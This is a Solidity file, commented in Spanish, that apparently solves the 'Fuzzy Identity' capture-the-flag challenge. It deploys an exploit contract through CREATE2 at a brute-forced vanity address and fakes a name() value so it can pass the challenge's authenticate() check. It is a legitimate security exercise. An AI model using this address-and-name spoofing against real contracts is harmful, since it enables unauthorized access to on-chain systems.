//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.12;


//Contrato que despliega el contrato exploit con el salt adecuado (buscado con fuzzy.py)
//El contrato exploit cumple con los dos requisitos, retorna name smarx y tiene
//vanity address 0xe73Eb684874e32e92badc0de1aDE93631229983c (con badc0de).
//Por ultimo, ejecutar exploit.ataque()

contract FuzzyIdentitySolverDeployer {

    function deploy(uint256 _salt) public returns(address) {
        return address(new exploit{salt: bytes32(_salt)}());
    }
}

interface IFuzzyIdentityChallenge{
    function authenticate() external;
}

contract exploit {
    function name() external pure returns (bytes32){
        return(bytes32("smarx"));
    }
    function ataque(address addr) public{
        IFuzzyIdentityChallenge victima=IFuzzyIdentityChallenge(addr);
        victima.authenticate();
    }
}

